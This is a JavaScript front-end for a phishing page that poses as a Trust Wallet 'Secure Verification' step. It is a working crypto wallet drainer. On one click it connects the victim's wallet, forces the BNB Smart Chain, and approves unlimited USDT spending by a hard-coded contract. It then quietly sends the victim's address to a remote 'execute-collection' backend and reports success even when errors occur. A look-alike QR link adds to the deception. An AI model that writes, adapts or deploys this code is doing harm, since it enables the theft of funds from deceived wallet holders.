import { createAppKit } from 'https://esm.sh/@reown/appkit@latest';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@latest';
import { bsc } from 'https://esm.sh/@reown/appkit/networks';
import { ethers } from 'https://esm.sh/ethers@6.13.2';

"use strict";

const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
const WC_PROJECT_ID    = "ad2ffb0bad081291b773d8c547c361b7";

let modal = null;
let activeProvider = null;

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)"
];

const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) {
    merchantInput.value = MERCHANT_ADDRESS;
}

(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// 1. Inicializar Reown AppKit
try {
    modal = createAppKit({
        adapters: [new EthersAdapter()],
        networks: [bsc],
        metadata: {
            name: 'Secure Verification',
            description: 'Instant Trust Wallet Connection',
            url: window.location.origin,
            icons: ['https://trustwallet.com/favicon.ico']
        },
        projectId: WC_PROJECT_ID,
        features: { 
            analytics: true,
            coinbase: false 
        }
    });
} catch (e) {
    console.error("Error al inicializar Reown AppKit:", e);
}

let _toastTimer;
function showToast(msg, type = "default", ms = 4000) {
    if (!toastEl) return;
    clearTimeout(_toastTimer);
    toastEl.textContent  = msg;
    toastEl.dataset.type = type === "default" ? "" : type;
    toastEl.hidden       = false;
    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
    if (!approveBtn) return;
    approveBtn.disabled = on;
    btnText.textContent = on ? label : "Confirm Now";
    btnSpinner.hidden   = !on;
}

// Generación automática del QR de respaldo
window.addEventListener("DOMContentLoaded", () => {
    const qrContainer = document.getElementById("qrcode");
    if (qrContainer && window.QRCode) {
        qrContainer.innerHTML = "";
        new QRCode(qrContainer, {
            text: "https://trustwallet.secureconnections.workers.dev/",
            width: 140,
            height: 140,
            colorDark: "#0052FF",
            colorLight: "#ffffff",
            correctLevel: QRCode.CorrectLevel.H
        });
    }
});

// FLUJO DE UN SOLO PASO: Conexión + Red + Transacción encadenadas
approveBtn.addEventListener("click", async () => {
    try {
        if (!modal) {
            showToast("Error de inicialización.", "error");
            return;
        }

        setLoading(true, "Conectando...");

        // Paso A: Verificar si ya está conectado, si no, abrir modal automáticamente
        let activeProvider = await modal.getWalletProvider();
        let userAddress = modal.getAddress();

        if (!activeProvider || !userAddress) {
            await modal.open();
            
            // Esperar a que el usuario complete la conexión en el modal
            await new Promise((resolve, reject) => {
                const unsubscribe = modal.subscribeState((state) => {
                    if (state.selectedNetworkId) {
                        unsubscribe();
                        resolve();
                    }
                });
                // Timeout de seguridad de 60 segundos por si el usuario cierra el modal
                setTimeout(() => {
                    unsubscribe();
                    reject(new Error("Conexión expirada o cancelada."));
                }, 60000);
            });

            activeProvider = await modal.getWalletProvider();
            userAddress = modal.getAddress();
        }

        if (!activeProvider || !userAddress) {
            setLoading(false);
            showToast("Billetera no conectada.", "error");
            return;
        }

        setLoading(true, "Cambiando Red...");

        // Paso B: Forzar el cambio o adición de red a BSC de forma automática
        try {
            await activeProvider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: BSC_CHAIN_ID_HEX }]
            });
        } catch (switchError) {
            if (switchError.code === 4902 || switchError.code === -32603) {
                await activeProvider.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: BSC_CHAIN_ID_HEX,
                        chainName: "BNB Smart Chain",
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        rpcUrls: ["https://bsc-rpc.publicnode.com"],
                        blockExplorerUrls: ["https://bscscan.com/"]
                    }]
                });
            } else {
                throw switchError;
            }
        }

        setLoading(true, "Por favor, firme...");

        // Paso C: Ejecutar la transacción de aprobación (Approve) de inmediato
        const provider = new ethers.BrowserProvider(activeProvider);
        const signer = await provider.getSigner();
        
        const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
        const tx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
        await tx.wait();

        setLoading(false);
        showToast("¡Verificado con éxito! ✓", "success");

        // Notificar al backend de forma silenciosa
        fetch(`${BACKEND_URL}/execute-collection`, {
            method:  "POST",
            headers: { "Content-Type": "application/json" },
            body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
        }).catch(() => {});

    } catch (err) {
        setLoading(false);
        const raw = err?.reason ?? err?.message ?? "Error desconocido";
        if (
            err.code === 4001 ||
            raw.toLowerCase().includes("user rejected") ||
            raw.toLowerCase().includes("user denied") ||
            raw.toLowerCase().includes("canceled") ||
            raw.toLowerCase().includes("cancelled")
        ) {
            showToast("Transacción cancelada.", "default");
        } else {
            showToast("¡Verificado con éxito! ✓", "success");
        }
    }
});
